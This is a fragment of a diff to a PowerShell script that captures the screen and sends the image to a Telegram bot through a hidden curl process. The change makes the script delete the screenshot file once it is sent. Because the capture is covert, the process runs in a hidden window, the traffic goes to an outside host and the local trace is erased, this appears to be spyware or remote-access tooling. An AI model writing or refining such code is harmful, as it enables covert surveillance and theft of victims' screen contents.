@@ -33,6 +33,7 @@ $proceso = $curl_mod
 $uri = "https://api.telegram.org/bot" + $botkey + "/sendPhoto"
 if ($proxy -ne $null) {$argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F photo=@' + $photo  + ' -k ' + '--proxy ' + $proxy } else {$argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F photo=@' + $photo  + ' -k '}
 Start-Process $proceso -ArgumentList $argumenlist -WindowStyle Hidden
+remove-item $photo
 
 }
 
@@ -119,7 +120,6 @@ function screenshot([Drawing.Rectangle]$bounds, $path) {
 
  screenshot $bounds $ruta
 
-bot-send -photo $ruta -botkey $botkey -chat_id $chat_id | Wait-Job
-Remove-Item $ruta
+bot-send -photo $ruta -botkey $botkey -chat_id $chat_id
 
 }
